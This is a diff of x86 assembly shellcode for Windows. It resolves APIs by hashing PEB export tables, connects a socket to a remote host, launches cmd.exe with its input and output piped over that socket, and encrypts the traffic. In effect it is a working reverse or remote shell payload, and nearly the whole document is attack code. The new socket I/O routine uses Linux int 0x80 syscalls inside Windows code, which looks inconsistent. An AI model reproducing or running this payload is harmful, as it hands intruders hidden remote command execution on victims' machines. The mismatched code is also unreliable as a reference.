@@ -27,94 +27,10 @@
 ;  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 ;  POSSIBILITY OF SUCH DAMAGE.
 ;  
+  bits 32
   
-  %define FD_MAX_EVENTS 10
-  
-  struc WSANETWORKEVENTS
-    lNetworkEvents resd 1
-    iErrorCode     resd FD_MAX_EVENTS
-  endstruc
-  
-  struc OVERLAPPED
-    Internal     resd 1
-    InternalHigh resd 1
-    Pointer      resd 1
-    Offset       equ Pointer
-    OffsetHigh   equ Pointer
-    hEvent       resd 1    
-  endstruc
-  
-  struc PROCESS_INFORMATION
-    hProcess    resd 1
-    hThread     resd 1
-    dwProcessId resd 1
-    dwThreadId  resd 1
-  endstruc
-  
-  struc STARTUPINFO
-    cb              resd 1
-    lpReserved      resd 1
-    lpDesktop       resd 1
-    lpTitle         resd 1
-    dwX             resd 1
-    dwY             resd 1
-    dwXSize         resd 1
-    dwYSize         resd 1
-    dwXCountChars   resd 1
-    dwYCountChars   resd 1
-    dwFillAttribute resd 1
-    dwFlags         resd 1
-    wShowWindow     resw 1
-    cbReserved2     resw 1
-    lpReserved2     resd 1
-    hStdInput       resd 1
-    hStdOutput      resd 1
-    hStdError       resd 1
-  endstruc
-  
-  ; data structure
-  struc ds_tbl
-    @ne      WSANETWORKEVENTS_size
-    @p       resd 1
-    @lap     OVERLAPPED_size
-    @len     resd 1
-    @out1    resd 1
-    @in0     resd 1
-    @in1     resd 1
-    @out0    resd 1
-    @evt0    resd 1
-    @evt1    resd 1
-    @si      resb STARTUPINFO_size
-    @pi      equ @si    
-    @len     resd 1
-    @buf     resb BUFSIZ+64
-  endstruc
-  
-  ; code structure
-  struc cs_tbl
-    ; kernel32
-    @TerminateProcess       resd 1
-    @CreateProcess          resd 1
-    @CreateEvent            resd 1
-    @WaitForMultipleObjects resd 1
-    @CloseHandle            resd 1
-    @WriteFile              resd 1
-    @ReadFile               resd 1
-    @GetOverlappedResult    resd 1
-    @CreateFile             resd 1
-    @CreatePipe             resd 1
-    @CreateNamedPipe        resd 1
-    
-    ; ws2_32 
-    @socket                 resd 1
-    @connect                resd 1
-    @send                   resd 1
-    @recv                   resd 1
-    @WSAEventSelect         resd 1  
-    @WSACreateEvent         resd 1
-    @WSAEnumNetworkEvents   resd 1 
-    @ioctlsocket            resd 1
-  endstruc  
+%define WIN  
+%include "include.inc" 
   
 main:
 _main:
@@ -127,16 +43,16 @@ _main:
       xchg   eax, ecx
 init_api:                        ; do {
       lodsd                        ;   get 32-bit hash
-      call   getapi32              ;   resolve API address
+      call   resolve_api              ;   resolve API address
       test   eax, eax
       jz     exit_init
       stosd                        ;   save
       loop   init_api              ; } while (--ecx)
       
-      lea    ebp, [edi+sizeof(DWORD)*4]
+      lea    ebp, [edi+4*4]
       
       push   ecx                   ; IPPROTO_IP
-      mov    cl, x.@len and 255
+      mov    cl, @len & 255
       lea    esi, [ebp+ecx]
       xor    edi, edi
     
@@ -153,9 +69,9 @@ init_api:                        ; do {
                                ; sa.sin_family=AF_INET
       mov    ecx, esp          ; ecx = &sa
     
-      ; connect (s, &sin, sizeof (sin));
-      push   16                    ; sizeof (sin)
-      push   ecx                   ; &sin
+      ; connect (s, &sa, sizeof (sa));
+      push   16                    ; sizeof (sa)
+      push   ecx                   ; &sa
       push   ebx                   ; s
       xcall  @connect
       pop    ecx
@@ -168,341 +84,454 @@ init_api:                        ; do {
  
 close_socket:
       ; closesocket (s);
-      push   @s
+      push   dword [ebp+@s]
       xcall  @closesocket
     
 exit_init:
-      sub    esp, -STACK_SIZE
+      sub    esp, cs_tbl+ds_tbl
       popad
       ret
 
-      ; ws2_32
-      hw HASH("socket")
-      hw HASH("connect")
-      hw HASH("closesocket")
-      hw HASH("send")
-      hw HASH("recv")
-      hw HASH("WSAEventSelect")
-      hw HASH("WSACreateEvent")
-      hw HASH("WSAEnumNetworkEvents")
-      hw HASH("ioctlsocket")
-
-      ; kernel32
-      hw HASH("CreateNamedPipeA")
-      hw HASH("CreatePipe")
-      hw HASH("CreateFileA")
-      hw HASH("GetOverlappedResult")
-      hw HASH("ReadFile")
-      hw HASH("WriteFile")
-      hw HASH("CloseHandle")
-      hw HASH("WaitForMultipleObjects")
-      hw HASH("CreateEventA")
-      hw HASH("CreateProcessA")
-      hw HASH("TerminateProcess")
-
-      ; advapi32
-      hw HASH("RtlGenRandom")
-
 ; ******************************************************** 
-get_api:
-    assume fs:nothing
-
-    pushad
-    push   30h
-    pop    esi
-    lods   dword ptr fs:[esi]
-    mov    eax, [eax+0Ch]
-    mov    esi, [eax+1Ch]
-load_dll:
-    mov    ebp, [esi+08h]
-    test   ebp, ebp
-    jz     exit_getapi
-load_next:
-    lodsd
-    push   eax
-
-    mov    eax, [ebp+3Ch]
-    mov    eax, [ebp+eax+78h] 
-    lea    esi, [ebp+eax+18h]
-    lodsd
-    xchg   eax, ecx
-    jecxz  load_dll
-
-    lodsd
-    add    eax, ebp
-    push   eax
-
-    lodsd
-    lea    edi, [ebp+eax]
-
-    lodsd
-    lea    ebx, [ebp+eax]
-load_api:
-    mov    esi, [edi+4*ecx-4]
-    add    esi, ebp
-    xor    eax, eax
-    cdq
-hash_api:
-    lodsb
-    add    edx, eax
-    rol    edx, ROL_CONSTANT
-    xor    edx, eax
-    dec    eax
-    jns    hash_api
-
-    cmp  edx, [esp+8+_eax]
-    
-    loopne load_api
-    
-    pop    eax
-    pop    esi
-    jne    load_dll
-
-    movzx  edx, word ptr [ebx+2*ecx]
-    add    ebp, [eax+4*edx]
-exit_getapi:
-    mov    [esp+_eax], ebp
-    popad
-    ret
-    
-
+resolve_api:
+      pushad                ; saves api hash on stack
+      xor    eax, eax
+      mov    eax, [fs:eax+30h]  ; eax = (PPEB) __readfsdword(0x30);
+      mov    eax, [eax+0ch] ; eax = (PPEB_LDR_DATA)peb->Ldr
+      mov    edi, [eax+0ch] ; edi = ldr->InLoadOrderModuleList.Flink
+      jmp    get_dll
+next_dll:    
+      mov    edi, [edi]     ; edi = dte->InLoadOrderLinks.Flink
+get_dll:
+      mov    ebx, [edi+18h] ; ebx = dte->DllBase
+      ; eax = IMAGE_DOS_HEADER.e_lfanew
+      mov    eax, [ebx+3ch]
+      ; ecx = IMAGE_DATA_DIRECTORY.VirtualAddress
+      mov    ecx, [ebx+eax+78h]
+      jecxz  next_dll
+      ; esi = IMAGE_EXPORT_DIRECTORY.Name
+      mov    esi, [ebx+ecx+0ch]
+      add    esi, ebx
+      xor    eax, eax
+      cdq
+hash_dll:
+      lodsb
+      add    edx, eax ;  h += *s++
+      rol    edx, 13  ;  h = ROTL32(h, 13) 
+      dec    eax
+      jns    hash_dll
+      mov    ebp, edx
+      
+      ; esi = offset IMAGE_EXPORT_DIRECTORY.NumberOfNames 
+      lea    esi, [ebx+ecx+18h]
+      lodsd
+      xchg   eax, ecx
+      jecxz  next_dll        ; skip if no names
+      push   edi             ; save edi
+      ; save IMAGE_EXPORT_DIRECTORY.AddressOfFunctions     
+      lodsd
+      add    eax, ebx        ; eax = RVA2VA(eax, ebx)
+      push   eax             ; save address of functions
+      ; edi = IMAGE_EXPORT_DIRECTORY.AddressOfNames
+      lodsd
+      add    eax, ebx        ; eax = RVA2VA(eax, ebx)
+      xchg   eax, edi        ; swap(eax, edi)
+      ; save IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals
+      lodsd
+      add    eax, ebx        ; eax = RVA(eax, ebx)
+      push   eax             ; save address of name ordinals
+get_name:
+      mov    esi, [edi+4*ecx-4] ; esi = RVA of API string
+      add    esi, ebx           ; esi = RVA2VA(esi, ebx)
+      xor    eax, eax           ; zero eax
+      cdq                       ; h = 0
+hash_name:    
+      lodsb
+      add    edx, eax
+      rol    edx, 13
+      dec    eax
+      jns    hash_name
+      add    edx, ebp           ; add hash of DLL string  
+      cmp    edx, [esp+_eax+12] ; hashes match?
+      loopne get_name           ; --ecx && edx != hash
+      pop    edx                ; edx = AddressOfNameOrdinals
+      pop    esi                ; esi = AddressOfFunctions
+      pop    edi                ; restore DLL entry
+      jne    next_dll           ; get next DLL        
+      movzx  eax, word [edx+2*ecx] ; eax = AddressOfNameOrdinals[eax]
+      add    ebx, [esi+4*eax] ; ecx = base + AddressOfFunctions[eax]
+      mov    [esp+_eax], ebx
+      popad                        ; restore all
+      ret
 ; ******************************************************** 
 wait_evt:
-    pushad
+      pushad
 
-    lea    esi, [ebp+@evt0]
-    mov    eax, [ebp+@evt0]
-    cdq
+      lea    esi, [ebp+@evt0]
+      mov    eax, [ebp+@evt0]
+      cdq
+      
+      ; ioctlsocket (s, FIONBIO, &off=0);
+      push   edx                   ; 0
+      push   esp                   ; &off
+      push   8004667Eh             ; FIONBIO
+      push   ebx                   ; s
+      
+      ; WSAEventSelect (s, evts[0], 0);
+      push   edx                   ; 0
+      push   eax                   ; evts[0]
+      push   ebx                   ; s
+      
+      ; WSAEnumNetworkEvents (s, evts[0], &ne);
+      push   ebp                   ; &ne
+      push   eax                   ; evts[0]
+      push   ebx                   ; s
+      
+      ; WaitForMultipleObjects (3, evts, FALSE, INFINITE);
+      push   -1                    ; INFINITE
+      push   edx                   ; FALSE
+      push   esi                   ; &evts
+      push   3   ; number of events to monitor
+      
+      ; WSAEventSelect (s, evts[0], FD_READ | FD_CLOSE);
+      push   21h                   ; FD_READ or FD_CLOSE
+      push   eax                   ; evts[0]
+      push   ebx                   ; s
+      xcall  @WSAEventSelect
+      xcall  @WaitForMultipleObjects
+      xchg   eax, edi              ; esi = event index
+      xcall  @WSAEnumNetworkEvents
+      xcall  @WSAEventSelect
+      xcall  @ioctlsocket
+      pop    edx                   ; remove &off
+      
+      ; if (ne.lNetworkEvents & FD_CLOSE) {
+      ;   break;
+      ; }    
+      mov    esi, ebp
+      lodsd
+      test   al, FD_CLOSE
+      mov    [esp+_edi], edi
+      popad
+      ret
     
-    ; ioctlsocket (s, FIONBIO, &off=0);
-    push   edx                   ; 0
-    push   esp                   ; &off
-    push   8004667Eh             ; FIONBIO
-    push   ebx                   ; s
-    
-    ; WSAEventSelect (s, evts[0], 0);
-    push   edx                   ; 0
-    push   eax                   ; evts[0]
-    push   ebx                   ; s
-    
-    ; WSAEnumNetworkEvents (s, evts[0], &ne);
-    push   ebp                   ; &ne
-    push   eax                   ; evts[0]
-    push   ebx                   ; s
-    
-    ; WaitForMultipleObjects (3, evts, FALSE, INFINITE) - WAIT_OBJECT_0;
-    push   -1                    ; INFINITE
-    push   edx                   ; FALSE
-    push   esi                   ; &evts
-    push   3   ; number of events to monitor
-    
-    ; WSAEventSelect (s, evts[0], FD_READ | FD_CLOSE);
-    push   21h                   ; FD_READ or FD_CLOSE
-    push   eax                   ; evts[0]
-    push   ebx                   ; s
-    xcall  @WSAEventSelect
-    xcall  @WaitForMultipleObjects
-    xchg   eax, edi              ; esi = event index
-    xcall  @WSAEnumNetworkEvents
-    xcall  @WSAEventSelect
-    xcall  @ioctlsocket
-    pop    edx                   ; remove &off
-    
-    ; if (ne.lNetworkEvents & FD_CLOSE) {
-    ;   break;
-    ; }    
-    mov    esi, ebp
-    lodsd
-    test   al, FD_CLOSE
-    mov    [esp+_edi], edi
-    popad
-    ret
+; ********************************************************
+cmd_loop:
+      pushad                       ; save all
+      
+      ; wait for events
+      call   wait_evt
+      jnz    cmd_cleanup           ; socket closed
 
+      ; zero signal indicates data received on socket
+      test   edi, edi
+      jz     receive_data          ; evts[0] ?
+      
+      ; if not 1, assume it's cmd.exe terminating or undefined error
+      dec    edi
+      jnz    cmd_cleanup
+
+      ; if (pending == 0) goto read_data;
+      cmp    dword [ebp+@p], edi
+      mov    eax, [ebp+@out1]   ; eax=out[1]
+      lea    edx, [ebp+@lap]    ; edx=&lap
+      jz     read_data
+      
+      ; if (!GetOverlappedResult (out[1], &lap, &len, FALSE) break;
+      push   edi                   ; FALSE
+      push   esi                   ; &len
+      push   edx                   ; &lap
+      push   eax                   ; out[1]
+      xcall  @GetOverlappedResult
+      dec    eax
+      jnz    cmd_cleanup
+      jmp    send_data
+read_data:
+      ; ReadFile (out[1], buf, BUFSIZ, &len, &lap);
+      push   edx                   ; &lap
+      push   esi                   ; &len
+      push   BUFSIZ
+      lea    ecx, [esi+4]
+      push   ecx                   ; buf
+      push   eax                   ; out[1]
+      xcall  @ReadFile
+      
+      inc    dword [ebp+@p]  ; pending++;
+send_data:
+      mov    ecx, [esi]            ; ecx=len
+      jecxz  continue              ; if (len==0) goto continue;
+      
+      dec    dword [ebp+@p]  ; pending--;
+
+      call   spp_send    
+      jg     continue              ; goto continue;
+receive_data:
+      call   spp_recv                ; if (recv32()<=0) goto cmd_cleanup;
+      jle    cmd_cleanup
+      
+      ; WriteFile (in[0], buf, len, &len, 0);
+      push   edi                   ; 0
+      push   esi                   ; &len
+      lodsd
+      push   eax                   ; len
+      push   esi                   ; buf
+      push   dword[ebp+@in0]         ; in[0]
+      xcall  @WriteFile
+continue:
+      popad
+      jmp    cmd_loop
+cmd_cleanup:
+      popad
+      ret    
 ; ********************************************************    
 exec_cmd:
-    pushad                       ; save all
-    lea    edi, [ebp+@out1]
-    push   edi                   ; save for closing handles on exit
-    
-    ; create event for hStdOutput of cmd.exe, signalled / auto reset
-    ; CreateEvent (NULL, TRUE, TRUE, NULL);
-    push   eax                   ; NULL
-    push   ebx                   ; TRUE
-    push   ebx                   ; TRUE
-    push   eax                   ; NULL
-    
-    ; SECURITY_ATTRIBUTES sa={sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};
-    push   ebx                   ; TRUE
-    push   eax                   ; NULL
-    push   SECURITY_ATTRIBUTES_size
-    mov    esi, esp
-    
-    ; "\\.\pipe\1"
-    push   not SWAP32("\1") shr 16
-    push   SWAP32("pipe")
-    push   SWAP32("\\.\")
-    mov    ecx, esp
-    
-    ; CreateFileA ("\\\\.\\pipe\\1", MAXIMUM_ALLOWED, 0, &sa, OPEN_EXISTING, 0, NULL);
-    push   eax                   ; NULL
-    push   eax                   ; 0
-    push   3h                    ; OPEN_EXISTING
-    push   esi                   ; &sa
-    push   eax                   ; 0
-    push   2000000h          ; MAXIMUM_ALLOWED
-    push   ecx                   ; "\\\\.\\pipe\\1", 0
-    
-    ; CreateNamedPipeA ("\\\\.\\pipe\\1", PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
-    ;    PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 
-    ;    PIPE_UNLIMITED_INSTANCES, 0, 0, 0, NULL);      
-    push   eax                   ; NULL
-    push   eax                   ; 0
-    push   eax                   ; 0
-    push   eax                   ; 0
-    push   1                   ; 1 here, PIPE_UNLIMITED_INSTANCES=255
-    push   eax                   ; PIPE_TYPE_BYTE or PIPE_READMODE_BYTE or PIPE_WAIT
-    push   40000003h         ; PIPE_ACCESS_DUPLEX or FILE_FLAG_OVERLAPPED
-    push   ecx                   ; "\\\\.\\pipe\\1", 0
-    xcall  @CreateNamedPipeA
-    stosd                        ; save out[1]
-    cdq
-    
-    ; CreatePipe (&in[1], &in[0], &sa, 0);
-    push   edx                   ; 0
-    push   esi                   ; &sa
-    push   edi                   ; &in[0]
-    scasd                        ; edi += 4
-    push   edi                   ; &in[1]
-    mov    esi, edi              ; esi = &in[1]
-    scasd                        ; edi += 4
-    xcall  @CreatePipe           ; should return TRUE    
-    xcall  @CreateFileA
-    stosd                        ; save out[0]
-    add    esp, SECURITY_ATTRIBUTES_size + 3*4
-    
-    ; create event for socket read and close events
-    xcall  @WSACreateEvent
-    stosd                        ; save evts[0]
-    
-    xcall  @CreateEventA
-    stosd                        ; save evts[1]
-    mov    [ebp+@lap+hEvent], eax
-    cdq
-    
-    ; "cmd", 0
-    push   SWAP32("cmd") shr 8
-    mov    eax, esp
-    
-    ; CreateProcess (NULL, "cmd", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
-    push   edi                   ; &pi
-    push   edi                   ; &si
-    push   edx                   ; NULL
-    push   edx                   ; NULL
-    push   edx                   ; 0
-    push   ebx                   ; TRUE
-    push   edx                   ; NULL
-    push   edx                   ; NULL
-    push   eax                   ; "cmd", 0
-    push   edx                   ; NULL
-    
-    push   STARTUPINFO_size
-    pop    dword [edi+cb]
-    inc    dword [edi+dwFlags+1] ; STARTF_USESTDHANDLES
-    
-    lea    edi, [edi+@si+hStdInput]
-    movsd                        ; si.hStdInput = in[1];
-    lodsd                        ; eax = out[0]
-    stosd                        ; si.hStdOutput = out[0]
-    stosd                        ; si.hStdError  = out[0]
-    xcall  @CreateProcessA
-    pop    eax                   ; remove "cmd", 0
-    mov    esi, edi
-cmd_loop:
-    pushad                       ; save all
-    
-    ; wait for events
-    call   wait_evt
-    jnz    cmd_cleanup           ; socket closed
+      pushad                       ; save all
+      lea    edi, [ebp+@out1]
+      push   edi                   ; save for closing handles on exit
+      
+      ; create event for hStdOutput of cmd.exe, signalled / auto reset
+      ; CreateEvent (NULL, TRUE, TRUE, NULL);
+      push   eax                   ; NULL
+      push   ebx                   ; TRUE
+      push   ebx                   ; TRUE
+      push   eax                   ; NULL
+      
+      ; SECURITY_ATTRIBUTES sa={sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};
+      push   ebx                   ; TRUE
+      push   eax                   ; NULL
+      push   SECURITY_ATTRIBUTES_size
+      mov    esi, esp
+      
+      ; "\\.\pipe\1"
+      push   "\1" >> 16
+      push   "pipe"
+      push   "\\.\"
+      mov    ecx, esp
+      
+      ; CreateFileA ("\\\\.\\pipe\\1", MAXIMUM_ALLOWED, 0, &sa, OPEN_EXISTING, 0, NULL);
+      push   eax                   ; NULL
+      push   eax                   ; 0
+      push   3h                    ; OPEN_EXISTING
+      push   esi                   ; &sa
+      push   eax                   ; 0
+      push   2000000h          ; MAXIMUM_ALLOWED
+      push   ecx                   ; "\\\\.\\pipe\\1", 0
+      
+      ; CreateNamedPipeA ("\\\\.\\pipe\\1", PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
+      ;    PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 
+      ;    PIPE_UNLIMITED_INSTANCES, 0, 0, 0, NULL);      
+      push   eax                   ; NULL
+      push   eax                   ; 0
+      push   eax                   ; 0
+      push   eax                   ; 0
+      push   1                   ; 1 here, PIPE_UNLIMITED_INSTANCES=255
+      push   eax                   ; PIPE_TYPE_BYTE or PIPE_READMODE_BYTE or PIPE_WAIT
+      push   40000003h         ; PIPE_ACCESS_DUPLEX or FILE_FLAG_OVERLAPPED
+      push   ecx                   ; "\\\\.\\pipe\\1", 0
+      xcall  @CreateNamedPipe
+      stosd                        ; save out[1]
+      cdq
+      
+      ; CreatePipe (&in[1], &in[0], &sa, 0);
+      push   edx                   ; 0
+      push   esi                   ; &sa
+      push   edi                   ; &in[0]
+      scasd                        ; edi += 4
+      push   edi                   ; &in[1]
+      mov    esi, edi              ; esi = &in[1]
+      scasd                        ; edi += 4
+      xcall  @CreatePipe           ; should return TRUE    
+      xcall  @CreateFile
+      stosd                        ; save out[0]
+      add    esp, SECURITY_ATTRIBUTES_size + 3*4
+      
+      ; create event for socket read and close events
+      xcall  @WSACreateEvent
+      stosd                        ; save evts[0]
+      
+      xcall  @CreateEvent
+      stosd                        ; save evts[1]
+      mov    [ebp+@lap+hEvent], eax
+      cdq
+      
+      ; "cmd", 0
+      push   "cmd"
+      mov    eax, esp
+      
+      ; CreateProcess (NULL, "cmd", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
+      push   edi                   ; &pi
+      push   edi                   ; &si
+      push   edx                   ; NULL
+      push   edx                   ; NULL
+      push   edx                   ; 0
+      push   ebx                   ; TRUE
+      push   edx                   ; NULL
+      push   edx                   ; NULL
+      push   eax                   ; "cmd", 0
+      push   edx                   ; NULL
+      
+      push   STARTUPINFO_size
+      pop    dword [edi+cb]
+      inc    dword [edi+dwFlags+1] ; STARTF_USESTDHANDLES
+      
+      lea    edi, [edi+@si+hStdInput]
+      movsd                        ; si.hStdInput = in[1];
+      lodsd                        ; eax = out[0]
+      stosd                        ; si.hStdOutput = out[0]
+      stosd                        ; si.hStdError  = out[0]
+      xcall  @CreateProcess
+      pop    eax                   ; remove "cmd", 0
 
-    ; zero signal indicates data received on socket
-    test   edi, edi
-    jz     receive_data          ; evts[0] ?
-    
-    ; if not 1, assume it's cmd.exe terminating or undefined error
-    dec    edi
-    jnz    cmd_cleanup
-
-    ; if (pending == 0) goto read_data;
-    cmp    dword [ebp+@p], edi
-    mov    eax, [ebp+@out1]   ; eax=out[1]
-    lea    edx, [ebp+@lap]    ; edx=&lap
-    jz     read_data
-    
-    ; if (!GetOverlappedResult (out[1], &lap, &len, FALSE) break;
-    push   edi                   ; FALSE
-    push   esi                   ; &len
-    push   edx                   ; &lap
-    push   eax                   ; out[1]
-    xcall  @GetOverlappedResult
-    dec    eax
-    jnz    cmd_cleanup
-    jmp    send_data
-read_data:
-    ; ReadFile (out[1], buf, BUFSIZ, &len, &lap);
-    push   edx                   ; &lap
-    push   esi                   ; &len
-    push   [ebp+@len]            ; BUFSIZ
-    lea    ecx, [esi+4]
-    push   ecx                   ; buf
-    push   eax                   ; out[1]
-    xcall  @ReadFile
-    
-    inc    dword ptr[ebp+@p]  ; pending++;
-send_data:
-    mov    ecx, [esi]            ; ecx=len
-    jecxz  continue              ; if (len==0) goto continue;
-    
-    dec    dword ptr[ebp+@p]  ; pending--;
-
-    call   spp_send    
-    jg     continue              ; goto continue;
-receive_data:
-    call   spp_recv                ; if (recv32()<=0) goto cmd_cleanup;
-    jle    cmd_cleanup
-    
-    ; WriteFile (in[0], buf, len, &len, 0);
-    push   edi                   ; 0
-    push   esi                   ; &len
-    lodsd
-    push   eax                   ; len
-    push   esi                   ; buf
-    push   [ebp+@in0]         ; in[0]
-    xcall  @WriteFile
-continue:
-    popad
-    jmp    cmd_loop
-cmd_cleanup:
-    popad
-
-    ; TerminateProcess (pi.hProcess, GetLastError());
-    push   ecx
-    push   [ebp+@pi+hProcess]
-    xcall  @TerminateProcess
-    
-    ; for (int i=0; i<8; i++) {
-    ;   CloseHandle (h[i]);
-    ; }
-    pop    esi                   ; esi=&h[0];
-    push   8
-    pop    ebx
+      mov    esi, edi
+      call   cmd_loop
+      
+      ; TerminateProcess (pi.hProcess, GetLastError());
+      push   ecx
+      push   dword[ebp+@pi+hProcess]
+      xcall  @TerminateProcess
+      
+      ; for (int i=0; i<8; i++) {
+      ;   CloseHandle (h[i]);
+      ; }
+      pop    esi                   ; esi=&h[0];
+      push   8
+      pop    ebx
 close_loop:
-    lodsd
-    push   eax
-    xcall  @CloseHandle
-    dec    ebx
-    jnz    close_loop
+      lodsd
+      push   eax
+      xcall  @CloseHandle
+      dec    ebx
+      jnz    close_loop
 
-    popad
-    ret
+      popad
+      ret
 
-
+; ***********************************
+;
+; send or receive packet, fragmented if required
+;
+; buflen in edx
+; buf in edi
+; ctx in ebp
+; socket operation in ebx : SYS_RECV or SYS_SEND
+; ***********************************      
+socket_io:
+      pushad
+      xor    esi, esi         ; sum = 0
+io_loop:
+      cmp    esi, edx         ; sum<buflen
+      jae    exit_io
+      
+      xor    eax, eax
+      push   eax              ; flags = 0
+      mov    ecx, edx
+      sub    ecx, esi
+      push   ecx              ; len   = buflen - sum
+      lea    ecx, [esi+edi] 
+      push   ecx              ; buf   = &buf[sum]
+      push   dword[ebp+@s]     ; socket
+      mov    ecx, esp         ; ecx   = &args          
+      int    0x80
+      
+      add    esp, 4*4         ; fix-up stack
+      
+      test   eax, eax         ; if (len <= 0) return -1; 
+      jle    exit_io
+      
+      add    esi, eax         ; sum += len
+      jmp    io_loop
+exit_io:
+      test   eax, eax
+      mov    [esp+_eax], esi  ; return sum          
+      popad
+      ret      
+; ***********************************
+;
+; send packet, fragmented if required
+;
+; buflen in edx
+; buf in edi
+; ctx in ebp
+; ***********************************
+send_pkt:
+      pushad
+      ; 1. wrap
+      xor    ecx, ecx         ; ecx = ENCRYPT
+      call   encrypt
+      xchg   eax, edx      
+      ; 2. send
+      call   socket_io   
+      popad
+      ret
+; ***********************************
+;
+; send data, encrypted if required
+;
+; ***********************************      
+spp_send:
+      pushad      
+      ; 1. send length (including MAC)
+      pushad
+      pushad
+      mov    edi, esp
+      mov    dword[edi], edx ; store length of outgoing data
+      add    dword[edi], 8
+      mov    dl, 4       ; send 4 bytes, assumes BUFSIZ < 256
+      call   send_pkt
+      popad
+      popad  
+      jle    exit_send      
+      ; 2. send the data
+      call   send_pkt      
+exit_send:    
+      popad
+      ret
+; ***********************************
+;
+; receive packet, fragmented if required
+;
+; buflen in edx
+; buf in edi
+; ctx in ebp
+;
+; socket_io will return sum of bytes received
+; encrypt will return decrypted bytes or -1
+;
+; the test will set flags accordingly
+; a JLE is for an error
+; ***********************************
+recv_pkt:
+      pushad     
+      ; 1. receive
+      call   socket_io
+      jle    exit_rpkt      
+      ; 2. unwrap
+      push   1
+      pop    ecx              ; ecx = DECRYPT
+      call   encrypt
+      test   eax, eax
+exit_rpkt:      
+      mov    [esp+_eax], eax  ; return length or -1 on error 
+      popad
+      ret
+; ***********************************
+;
+; receive data, decrypt if required
+;
+; ***********************************      
+spp_recv:
+      pushad
+      ; 1. receive the length (which includes a MAC)
+      push   4 + 8             ; sizeof(uint32_t) + SPP_MAC_LEN
+      pop    edx
+      call   recv_pkt
+      jle    exit_recv      
+      ; 2. receive the data
+      mov    edx, [edi]        ; edx = buflen      
+      call   recv_pkt
+exit_recv:
+      mov    [esp+_eax], eax   ; return length or -1   
+      popad
+      ret
+    
+%include "cpx.asm"
